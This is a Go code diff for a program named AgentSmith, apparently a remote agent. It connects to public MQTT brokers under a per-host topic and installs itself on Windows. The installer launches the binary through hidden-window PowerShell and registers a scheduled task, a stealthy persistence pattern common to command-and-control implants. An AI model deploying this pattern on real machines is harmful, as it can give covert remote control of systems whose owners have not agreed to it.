@@ -18,6 +18,12 @@ import (
 
 const version = "1.0.0"
 
+var brokers = []string{
+	"tcp://test.mosquitto.org:1883",
+	"tcp://broker.emqx.io:1883",
+	"tcp://broker.hivemq.com:1883",
+}
+
 func initLog() {
 	logFile := filepath.Join(os.TempDir(), "agentsmith.log")
 	f, err := os.OpenFile(logFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
@@ -47,13 +53,23 @@ func main() {
 
 	hostname, _ := os.Hostname()
 
-	mqttClient, err := mqtt.New("tcp://test.mosquitto.org:1883")
+	var mqttClient *mqtt.Client
+	var err error
+	for _, broker := range brokers {
+		log.Printf("Trying MQTT broker: %s", broker)
+		mqttClient, err = mqtt.New(broker)
+		if err == nil {
+			log.Printf("Connected to broker: %s", broker)
+			break
+		}
+		log.Printf("Broker %s failed: %v", broker, err)
+	}
 	if err != nil {
-		log.Fatalf("Failed to start MQTT client: %v", err)
+		log.Fatalf("All MQTT brokers failed: %v", err)
 	}
 	defer mqttClient.Disconnect(250)
 
-	log.Printf("Connected to MQTT broker, agent/%s/", hostname)
+	log.Printf("Agent ready on agent/%s/", hostname)
 
 	srv := server.New(hostname, version, time.Now())
 	go func() {
@@ -82,6 +98,14 @@ func doInstall() {
 		log.Printf("Failed to copy binary: %v", err)
 	}
 
+	fmt.Println("Starting agent directly...")
+	cmd := exec.Command(dest)
+	cmd.Stdout = os.Stdout
+	cmd.Stderr = os.Stderr
+	if err := cmd.Start(); err != nil {
+		log.Printf("Direct start failed: %v", err)
+	}
+
 	psCmd := fmt.Sprintf(
 		`powershell -WindowStyle Hidden -Command Start-Process -FilePath '%s' -WindowStyle Hidden`,
 		dest,
@@ -93,11 +117,6 @@ func doInstall() {
 	)
 	if out, err := create.CombinedOutput(); err != nil {
 		log.Printf("schtasks create failed: %v\n%s", err, out)
-	}
-
-	run := exec.Command("schtasks", "/run", "/tn", name)
-	if out, err := run.CombinedOutput(); err != nil {
-		log.Printf("schtasks run failed: %v\n%s", err, out)
 	}
 
 	fmt.Println("AgentSmith installed and started.")
